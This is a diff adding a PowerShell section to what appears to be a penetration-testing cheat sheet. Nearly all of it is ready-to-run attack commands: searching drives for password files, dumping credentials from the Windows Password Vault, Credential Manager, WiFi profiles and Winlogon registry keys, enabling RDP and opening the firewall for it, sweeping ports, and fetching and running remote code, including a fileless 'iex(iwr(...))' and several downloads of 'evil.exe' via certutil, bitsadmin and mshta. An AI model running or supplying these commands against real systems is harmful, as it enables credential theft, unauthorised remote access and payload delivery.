@@ -27,6 +27,89 @@ nmap -sS -Pn -A -sV -p $open_ports --open -vvvv -n -iL ip.txt -oA nmapfull
 naabu -list <ip.txt> -rate 5000 -nmap-cli 'nmap -sV -oA naabu_nmap'
 ```
 
+## PowerShell Enumeration Commands 
+Reference : https://www.infosecmatter.com/powershell-commands-for-pentesters/ 
+#### Find sensitive info
+```
+Get-ChildItem c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts*,*sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue
+```
+#### Find Password string in files
+```
+Get-ChildItem c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
+```
+#### Dump Passwords from Windows Password Vault
+```
+[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
+```
+#### Dump Passwords from Windows Credential Manager
+```
+Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }
+```
+#### Dump WiFi Passwords
+```
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+```
+#### Dump Auto-Logon Credentials
+```
+gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"
+```
+#### Enable RDP
+```
+(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)
+```
+#### Allow RDP on Firewall
+```
+Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True
+```
+#### Port Sweep
+```
+$port = 22
+$net = "10.10.0."
+0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) "Port $port is open on $net$_"} 2>$null
+```
+#### Fileless Download
+```
+iex(iwr("https://URL"))
+```
+#### List Installed Antivirus
+```
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
+```
+#### Check if system is part of Domain
+```
+(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
+```
+#### 
+#### File Download Technique 1
+```
+Invoke-WebRequest -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
+```
+```
+wget -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
+```
+```
+curl -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
+```
+```
+iwr -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
+```
+```
+Invoke-RestMethod -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
+```
+```
+Import-Module BitsTransfer
+Start-BitsTransfer -source "http://ip/evil.exe" -destination "evil.exe"
+```
+```
+certutil.exe -urlcache -split -f http://ip/evil.exe evil.exe
+```
+```
+mshta http://ip/evil.exe
+```
+```
+bitsadmin /transfer test /download /priority high http://ip/evil.exe C:\evil.exe
+```
+
 ## PowerShell Execution Bypass Techniques
 
 #### Netspi blog - https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
